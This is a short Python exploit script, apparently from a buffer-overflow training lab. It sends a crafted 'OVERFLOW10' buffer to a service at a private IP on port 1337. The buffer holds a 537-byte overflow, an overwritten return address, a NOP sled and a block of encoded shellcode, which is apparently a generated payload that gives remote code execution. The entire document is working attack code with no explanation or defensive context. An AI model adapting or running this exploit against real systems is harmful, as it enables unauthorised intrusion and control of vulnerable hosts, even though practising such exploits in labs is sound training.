#!/usr/bin/env python3

import socket

ip = "10.10.5.108"
port = 1337

prefix = "OVERFLOW10 "
offset = 537
overflow = "A" * offset
retn = "\xf7\x11\x50\x62" # 625011f7
padding = "\x90" * 16
payload = ("\x29\xc9\x83\xe9\xaf\xe8\xff\xff\xff\xff\xc0\x5e\x81\x76\x0e"
"\x6d\x44\x83\x38\x83\xee\xfc\xe2\xf4\x91\xac\x01\x38\x6d\x44"
"\xe3\xb1\x88\x75\x43\x5c\xe6\x14\xb3\xb3\x3f\x48\x08\x6a\x79"
"\xcf\xf1\x10\x62\xf3\xc9\x1e\x5c\xbb\x2f\x04\x0c\x38\x81\x14"
"\x4d\x85\x4c\x35\x6c\x83\x61\xca\x3f\x13\x08\x6a\x7d\xcf\xc9"
"\x04\xe6\x08\x92\x40\x8e\x0c\x82\xe9\x3c\xcf\xda\x18\x6c\x97"
"\x08\x71\x75\xa7\xb9\x71\xe6\x70\x08\x39\xbb\x75\x7c\x94\xac"
"\x8b\x8e\x39\xaa\x7c\x63\x4d\x9b\x47\xfe\xc0\x56\x39\xa7\x4d"
"\x89\x1c\x08\x60\x49\x45\x50\x5e\xe6\x48\xc8\xb3\x35\x58\x82"
"\xeb\xe6\x40\x08\x39\xbd\xcd\xc7\x1c\x49\x1f\xd8\x59\x34\x1e"
"\xd2\xc7\x8d\x1b\xdc\x62\xe6\x56\x68\xb5\x30\x2c\xb0\x0a\x6d"
"\x44\xeb\x4f\x1e\x76\xdc\x6c\x05\x08\xf4\x1e\x6a\xbb\x56\x80"
"\xfd\x45\x83\x38\x44\x80\xd7\x68\x05\x6d\x03\x53\x6d\xbb\x56"
"\x68\x3d\x14\xd3\x78\x3d\x04\xd3\x50\x87\x4b\x5c\xd8\x92\x91"
"\x14\x52\x68\x2c\x89\x3c\x45\x9c\xeb\x3a\x6d\x55\xdf\xb1\x8b"
"\x2e\x93\x6e\x3a\x2c\x1a\x9d\x19\x25\x7c\xed\xe8\x84\xf7\x34"
"\x92\x0a\x8b\x4d\x81\x2c\x73\x8d\xcf\x12\x7c\xed\x05\x27\xee"
"\x5c\x6d\xcd\x60\x6f\x3a\x13\xb2\xce\x07\x56\xda\x6e\x8f\xb9"
"\xe5\xff\x29\x60\xbf\x39\x6c\xc9\xc7\x1c\x7d\x82\x83\x7c\x39"
"\x14\xd5\x6e\x3b\x02\xd5\x76\x3b\x12\xd0\x6e\x05\x3d\x4f\x07"
"\xeb\xbb\x56\xb1\x8d\x0a\xd5\x7e\x92\x74\xeb\x30\xea\x59\xe3"
"\xc7\xb8\xff\x63\x25\x47\x4e\xeb\x9e\xf8\xf9\x1e\xc7\xb8\x78"
"\x85\x44\x67\xc4\x78\xd8\x18\x41\x38\x7f\x7e\x36\xec\x52\x6d"
"\x17\x7c\xed")
postfix = ""

buffer = prefix + overflow + retn + padding + payload + postfix

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
  s.connect((ip, port))
  print("Sending evil buffer...")
  s.send(bytes(buffer + "\r\n", "latin-1"))
  print("Done!")
except:
  print("Could not connect.")
